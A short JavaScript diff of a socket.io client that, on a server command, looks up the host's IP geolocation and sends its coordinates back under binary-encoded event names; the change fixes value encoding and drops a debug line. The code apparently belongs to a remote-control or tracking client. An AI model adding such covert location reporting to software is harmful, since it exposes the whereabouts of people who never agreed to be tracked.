@@ -289,11 +289,9 @@ socket.on('connect', async () => {
     socket.on(location, async (id) => {
         const raw = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,query');
         info = await raw.json();
-
-        console.log(info.lat,' ',typeof(info.lat),' and ',info.lon,' ',type(info.lon));
         
-        const lat = stringToBinary(info.lat);
-        const lon = stringToBinary(info.lon);
+        const lat = stringToBinary(JSON.stringify(info.lat));
+        const lon = stringToBinary(JSON.stringify(info.lon));
         const sendLocation = binaryEvent('sendLocation');
         socket.emit(sendLocation, lat, lon);
     });
